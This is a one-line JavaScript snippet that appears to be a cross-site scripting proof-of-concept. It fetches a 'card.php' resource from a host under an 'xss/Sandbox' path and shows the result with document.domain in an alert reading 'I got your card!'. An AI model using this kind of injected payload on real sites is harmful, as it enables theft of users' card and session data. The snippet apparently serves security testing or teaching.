$.get("http://good.com:3030/server/xss/Sandbox/card.php", function(r){alert(document.domain + " I got your card! " + r); });
